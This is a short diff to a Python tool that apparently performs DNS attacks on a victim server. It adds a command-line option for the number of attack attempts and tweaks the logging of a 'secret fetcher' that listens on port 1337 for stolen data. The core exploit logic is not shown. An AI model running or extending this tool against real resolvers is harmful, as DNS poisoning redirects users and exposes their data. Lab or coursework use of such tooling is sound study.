@@ -108,9 +108,9 @@ def secret_fetcher(server_ip, server_port):
     while secret_fetch_flag:
         try:
                 data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
-                log("({t.bold}secret fetcher{t.normal})Received response: \n\t" + str(data))
+                log("\n({t.bold}secret fetcher{t.normal})Received response: \n\t" + str(data))
                 stop = True
-                file_secret.write("Secret fetched: " + str(data))
+                file_secret.write("\nSecret fetched: " + str(data))
         except:
                 log("Error During secret fetching, exiting")
                 return
@@ -216,6 +216,7 @@ def fetch_parameter(*args):
         parser.add_argument('-si', '--secret-ip', dest='secret_ip', help='IP to bind for the secret fetcher', required=False, type=str, default="0.0.0.0")
         parser.add_argument('-sp', '--secret-port', dest='secret_port', help='Port to bind for the secret fetcher', required=False, type=int, default=1337)
 
+        parser.add_argument('-n', '--num-attack', dest='num_attack', help='Number of attack to perform', required=False, default=200, type=int)
         parser.add_argument('-nc', '--no-colors', dest='no_colors', help='Suppress coloured terminal output', required=False, action='store_true')
         parser.add_argument('-vb', '--verbosity', dest='verbosity', help='Verbosity level', required=False, choices=['1', '2','3','4'])
 
@@ -295,10 +296,10 @@ def main(*args):
         nic_interface = param['interface']
 
         attack_type = param['attack_type']
-
+        mode = param['mode']
+        num_of_tries = param['num_attack']
         ns_server_ip = param['ns_server']
 
-        mode = param['mode']
 
 
         #Launch the secret fetcher
@@ -307,7 +308,7 @@ def main(*args):
 
         try:
 
-                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=200,\
+                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=num_of_tries,\
                          victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface, mode=mode)
 
         except DNSAttack.CriticalError:
